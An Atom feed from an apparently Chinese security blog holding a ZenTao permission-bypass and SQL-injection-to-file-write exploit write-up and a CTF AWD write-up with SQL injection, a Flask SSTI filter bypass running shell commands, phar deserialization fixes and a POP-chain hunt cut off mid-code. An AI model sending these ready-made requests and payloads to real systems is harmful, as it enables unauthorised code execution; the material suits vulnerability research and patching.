<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c1ay</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c1aysec.github.io/"/>
  <updated>2023-01-13T15:16:38.881Z</updated>
  <id>https://c1aysec.github.io/</id>
  
  <author>
    <name>c1ay</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>禅道zentao 组合漏洞rce</title>
    <link href="https://c1aysec.github.io/2023/01/13/%E7%A6%85%E9%81%93zentao%20%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9Erce/"/>
    <id>https://c1aysec.github.io/2023/01/13/禅道zentao 组合漏洞rce/</id>
    <published>2023-01-13T14:52:23.764Z</published>
    <updated>2023-01-13T15:16:38.881Z</updated>
    
    <content type="html"><![CDATA[<p>看到很多地方都发了，那也没必要再藏了…</p><p>本地环境：18.0.beta1</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>17.4&lt;=version&lt;=18.0.beta1（开源版）</p><p>3.4&lt;=version&lt;=4.0.beta1（旗舰版）</p><p>7.4&lt;=version&lt;=8.0.beta1（企业版）</p><h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p>登录校验会依次经过：</p><p><code>framework/base/control.class.php-&gt;__construct</code>方法</p><p><code>www/index.php：$common-&gt;checkPriv();</code></p><p><img src="http://pic.c1imber.top/blog/20230113/isWDHDTtPKYv.png?imageslim" alt="mark"></p><p><strong>补丁对比</strong></p><p>通过补丁对比：</p><p>module/common/model.php-&gt;checkPriv方法</p><p><img src="http://pic.c1imber.top/blog/20230113/Twsq6f99BXSy.png?imageslim" alt="mark"></p><p>看到将<code>echo $endResponseException-&gt;getContent();</code>修复为了<code>die($endResponseException-&gt;getContent());</code></p><p>无需登录白名单：</p><p>config/zentaopms.php</p><p><img src="http://pic.c1imber.top/blog/20230113/a5pKFz2mIgql.png?imageslim" alt="mark"></p><p>在module/misc/control.php的captcha方法当中，存在session赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GET /zentao/misc-captcha-user HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">192.168</span><span class="number">.157</span><span class="number">.174</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Cookie: zentaosid=0f94562eee63fdffc089ad8a3e867ead;</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Pragma: no-cache</span></div><div class="line"><span class="comment">Cache-Control: no-cache</span></div></pre></td></tr></table></figure><p><strong>权限绕过原理：</strong></p><p>在设置完session user变量后，会进入<code>module/common/model.php-&gt;checkPriv</code>的<code>if(isset($this-&gt;app-&gt;user))</code>分支</p><p><img src="http://pic.c1imber.top/blog/20230113/cij7NYYgP4t6.png?imageslim" alt="mark"></p><p>接着会进入<code>$this-&gt;deny($module, $method);</code></p><p>跟进到module/common/model.php-&gt;deny方法</p><p><img src="http://pic.c1imber.top/blog/20230113/vQ2dkCSbrT1f.png?imageslim" alt="mark"></p><p>最终会执行到<code>helper::end();</code></p><p>跟进到framework/helper.class.php-&gt;end方法</p><p><img src="http://pic.c1imber.top/blog/20230113/oFIaRNT33Atf.png?imageslim" alt="mark"></p><p>抛出了<code>EndResponseException</code>异常，而module/common/model.php-&gt;checkPriv当中直接接收了异常并输出，之后程序会继续运行，导致权限绕过</p><p><img src="http://pic.c1imber.top/blog/20230113/9WJdSk1l9pWM.png?imageslim" alt="mark"></p><p>而补丁将echo修改为了die，程序走到这里会终止退出，不再继续往后执行，从而修复了权限绕过</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>通过补丁对比：<br>module/convert/model.php-&gt;dbExists方法</p><p><img src="http://pic.c1imber.top/blog/20230113/u2BEAFREwCgD.png?imageslim" alt="mark"></p><p>可以看到修复了一处sql注入</p><p>全局搜索<code>dbExists</code>，可以看到在module/convert/control.php的<code>importNotice</code>方法中进行了调用</p><p><img src="http://pic.c1imber.top/blog/20230113/XX3OJl6OiXEC.png?imageslim" alt="mark"></p><p>对应路由：<br>/zentao/convert-importNotice</p><p>通过注入可以直接写文件，结合之前的权限绕过，可以实现前台文件写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">POST /zentao/convert-importNotice HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">192.168</span><span class="number">.157</span><span class="number">.174</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Referer: http://192.168.157.174</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></div><div class="line"><span class="comment">Cookie: zentaosid=0f94562eee63fdffc089ad8a3e867ead</span></div><div class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></div><div class="line"><span class="comment">Content-Length: 111</span></div><div class="line"><span class="comment">Origin: http://192.168.157.174</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Pragma: no-cache</span></div><div class="line"><span class="comment">Cache-Control: no-cache</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">dbName=1';select '&lt;?php phpinfo();?&gt;' into outfile 'C:/Users/admin/Desktop/zbox/app/zentao/www/install.php'-- -</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20230113/YnSBoQ6XykjW.png?imageslim" alt="mark"></p><p><strong>web目录获取</strong></p><p>注入写文件需要知道web目录，有很多方法，这里只提供一种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">POST /zentao/repo-create HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">192.168</span><span class="number">.157</span><span class="number">.174</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Referer: http://192.168.157.174/</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></div><div class="line"><span class="comment">Cookie: zentaosid=0f94562eee63fdffc089ad8a3e867ead</span></div><div class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></div><div class="line"><span class="comment">Content-Length: 112</span></div><div class="line"><span class="comment">Origin: http://192.168.157.174/</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Pragma: no-cache</span></div><div class="line"><span class="comment">Cache-Control: no-cache</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">SCM=Subversion&amp;name=1&amp;path=1&amp;encoding=utf-8&amp;client=1&amp;account=1&amp;password=1&amp;encrypt=base64&amp;desc=&amp;uid=626134383da5e</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20230113/AlslwOfr8a61.png?imageslim" alt="mark"></p><p>提一下：</p><p>后台漏洞还有很多，例如命令执行，这里不再赘述，这次的rce重点还是在于权限绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看到很多地方都发了，那也没必要再藏了…&lt;/p&gt;
&lt;p&gt;本地环境：18.0.beta1&lt;/p&gt;
&lt;h3 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h3&gt;&lt;p&gt;17.4&amp;lt;=ver
      
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2022长城杯awdplus</title>
    <link href="https://c1aysec.github.io/2022/09/29/2022%E9%95%BF%E5%9F%8E%E6%9D%AFawdplus/"/>
    <id>https://c1aysec.github.io/2022/09/29/2022长城杯awdplus/</id>
    <published>2022-09-29T04:30:11.486Z</published>
    <updated>2022-09-29T11:07:06.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022长城杯awdplus"><a href="#2022长城杯awdplus" class="headerlink" title="2022长城杯awdplus"></a>2022长城杯awdplus</h1><h3 id="admin-page"><a href="#admin-page" class="headerlink" title="admin_page"></a>admin_page</h3><p>登录处用户名参数存在注入，直接写马读取flag即可</p><p><img src="http://pic.c1imber.top/blog/20220929/OozpemBYp7LL.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20220929/eFogPaMpYFrg.png?imageslim" alt="mark"></p><p>防御，<code>addslashes</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$username = addslashes($_POST[<span class="string">'username'</span>]);</div><div class="line">$password = addslashes($_POST[<span class="string">'password'</span>]);</div></pre></td></tr></table></figure><h3 id="numflask"><a href="#numflask" class="headerlink" title="numflask"></a>numflask</h3><p>flask ssti，但是题目没给源码，需要通过获取shell后得到源码提交修复补丁</p><p>通过黑盒测试发现过滤了数字和.等字符</p><p>bypass，寻找到os模块执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /name.php HTTP/<span class="number">1.1</span></div><div class="line">Host: eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.2</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.54</span> Safari/<span class="number">537.36</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></div><div class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: <span class="number">410</span></div><div class="line">Origin: http://eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span></div><div class="line">Connection: closea</div><div class="line">Referer: http://eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span>/</div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line"></div><div class="line">name=&#123;&#123;<span class="string">''</span>[<span class="string">"__class__"</span>][<span class="string">"__mro__"</span>][dict(a=a)|join|count][<span class="string">"__subclasses__"</span>]()[dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count][<span class="string">"__init__"</span>][<span class="string">"__glo"</span> <span class="string">"bals__"</span>][<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'cat /app/app*'</span>)[<span class="string">'read'</span>]()&#125;&#125;</div></pre></td></tr></table></figure><p>获取到flag和源码：</p><p><img src="http://pic.c1imber.top/blog/20220929/YXmBlnElnzze.png?imageslim" alt="mark"></p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory, render_template_string</div><div class="line">app = Flask(__name__)</div><div class="line">blacklists = [<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>, <span class="string">"0"</span>, <span class="string">"lipsum"</span>, <span class="string">"."</span>, <span class="string">"global"</span>, <span class="string">"request"</span>, <span class="string">"config"</span>, <span class="string">"builtins"</span>, <span class="string">"%"</span>]</div><div class="line"><span class="meta">@app.route('/', methods=['POST', 'GET'])</span></div><div class="line"><span class="meta">@app.route('/index.php', methods=['POST', 'GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</div><div class="line"><span class="meta">@app.route('/name.php', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span><span class="params">()</span>:</span></div><div class="line">    name = request.form[<span class="string">'name'</span>]</div><div class="line">    <span class="keyword">for</span> blacklist <span class="keyword">in</span> blacklists:</div><div class="line">        <span class="keyword">if</span> blacklist <span class="keyword">in</span> str(name).lower():</div><div class="line">            template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % <span class="string">"nooo"</span></div><div class="line">            <span class="keyword">return</span> render_template_string(template)</div><div class="line">    template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % name</div><div class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</div><div class="line"><span class="meta">@app.route('/robots.txt')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_from_root</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder, request.path[<span class="number">1</span>:])</div><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""" &lt;html&gt; &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor="white"&gt; &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; """</span>, <span class="number">404</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="string">"false"</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8888</span>)</div></pre></td></tr></table></figure><p>防御，去除<code>{}</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory, render_template_string</div><div class="line">app = Flask(__name__)</div><div class="line">blacklists = [<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>, <span class="string">"0"</span>, <span class="string">"lipsum"</span>, <span class="string">"."</span>, <span class="string">"global"</span>, <span class="string">"request"</span>, <span class="string">"config"</span>, <span class="string">"builtins"</span>, <span class="string">"%"</span>]</div><div class="line"><span class="meta">@app.route('/', methods=['POST', 'GET'])</span></div><div class="line"><span class="meta">@app.route('/index.php', methods=['POST', 'GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</div><div class="line"><span class="meta">@app.route('/name.php', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span><span class="params">()</span>:</span></div><div class="line">    name = request.form[<span class="string">'name'</span>].strip(<span class="string">"&#123;"</span>).strip(<span class="string">"&#125;"</span>)</div><div class="line">    <span class="keyword">for</span> blacklist <span class="keyword">in</span> blacklists:</div><div class="line">        <span class="keyword">if</span> blacklist <span class="keyword">in</span> str(name).lower():</div><div class="line">            template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % <span class="string">"nooo"</span></div><div class="line">            <span class="keyword">return</span> render_template_string(template)</div><div class="line">    template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % name</div><div class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</div><div class="line"><span class="meta">@app.route('/robots.txt')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_from_root</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder, request.path[<span class="number">1</span>:])</div><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""" &lt;html&gt; &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor="white"&gt; &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; """</span>, <span class="number">404</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="string">"false"</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8888</span>)</div></pre></td></tr></table></figure><h3 id="codeinlog"><a href="#codeinlog" class="headerlink" title="codeinlog"></a>codeinlog</h3><p>application/controllers/Upload.php</p><p><img src="http://pic.c1imber.top/blog/20220929/LwTHJIoaVYM8.png?imageslim" alt="mark"></p><p>上传文件到application/cache/upload.log，读取并输出，所以这里看起来是安全的</p><p>application/controllers/Welcome.php</p><p><img src="http://pic.c1imber.top/blog/20220929/3CGivvtsvtG0.png?imageslim" alt="mark"></p><p>存在风险：可以传入phar触发反序列化</p><p>漏洞修复：</p><p>直接过滤<code>phar://</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $file = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'file'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(stripos($file,<span class="string">"phar://"</span>)!==<span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($file)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'welcome_message'</span>, <span class="keyword">array</span>(<span class="string">'content'</span>=&gt; file_get_contents($file)));</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'upload_form'</span>, <span class="keyword">array</span>(<span class="string">'error'</span> =&gt; <span class="string">''</span>));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>防御成功，拿到防御分值</p><p>攻击分值现场队伍0解，赛后复现了一下</p><p>pop链挖掘：</p><p>全局搜索<code>__destruc</code>t起点，找到：</p><p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;__destruct</p><p><img src="http://pic.c1imber.top/blog/20220929/0UgCcq7ribmI.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line">...</div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span> <span class="keyword">implements</span> <span class="title">CacheItemPoolInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;commit();</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>定位到：</p><p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;commit</p><p><img src="http://pic.c1imber.top/blog/20220929/w2j9P4Boo2oN.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line">...</div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span> <span class="keyword">implements</span> <span class="title">CacheItemPoolInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span>: <span class="title">bool</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;deferredItems) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $now         = microtime(<span class="keyword">true</span>);</div><div class="line">        $itemsCount  = <span class="number">0</span>;</div><div class="line">        $byLifetime  = [];</div><div class="line">        $expiredKeys = [];</div><div class="line"></div><div class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;deferredItems <span class="keyword">as</span> $key =&gt; $item) &#123;</div><div class="line">            $lifetime = ($item-&gt;getExpiry() ?? $now) - $now;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ($lifetime &lt; <span class="number">0</span>) &#123;</div><div class="line">                $expiredKeys[] = $key;</div><div class="line"></div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            ++$itemsCount;</div><div class="line">            $byLifetime[(int) $lifetime][$key] = $item-&gt;get();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">switch</span> (count($expiredKeys)) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                <span class="keyword">$this</span>-&gt;cache-&gt;delete(current($expiredKeys));</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">$this</span>-&gt;doDeleteMultiple($expiredKeys);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ($itemsCount === <span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;save($key, $item-&gt;get(), (int) $lifetime);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $success = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">foreach</span> ($byLifetime <span class="keyword">as</span> $lifetime =&gt; $values) &#123;</div><div class="line">            $success = <span class="keyword">$this</span>-&gt;doSaveMultiple($values, $lifetime) &amp;&amp; $success;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $success;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>$key</code>和<code>$item</code>均来自<code>$this-&gt;deferredItems，$this-&gt;deferredItems</code>成员变量可控</p><p>全局搜索可利用的save方法，找到：<br>system/libraries/Cache/Cache.php-&gt;CI_Cache-&gt;save</p><p><img src="http://pic.c1imber.top/blog/20220929/pHUgSOmcLkIY.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Cache</span> <span class="keyword">extends</span> <span class="title">CI_Driver_Library</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($id, $data, $ttl = <span class="number">60</span>, $raw = FALSE)</span></span></div><div 